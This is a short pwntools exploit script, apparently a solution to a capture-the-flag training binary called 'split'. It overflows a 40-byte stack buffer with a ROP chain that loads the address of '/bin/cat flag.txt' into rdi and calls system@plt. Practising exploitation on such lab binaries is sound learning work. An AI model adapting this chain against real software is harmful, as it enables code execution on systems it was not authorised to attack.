from pwn import *

context.clear(arch='amd64')
context.terminal = ['urxvt', '-e']

binary = ELF('./split')
p = process("./split")

rop = ROP(binary)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
usefulString = binary.symbols['usefulString']
ret = rop.find_gadget(['ret'])[0]
system_plt = binary.plt['system']

bof_len = 40

rop_chain = b'A' * bof_len
rop_chain += p64(pop_rdi) # pop rdi; ret;
rop_chain += p64(usefulString) # db '/bin/cat flag.txt'
rop_chain += p64(ret) # ret;
rop_chain += p64(system_plt) # system@plt

#rop_chain += p64(0x000000000040074b) # call _system

#gdb.attach(p, gdbscript="b *pwnme")

p.sendline(rop_chain)
p.interactive()
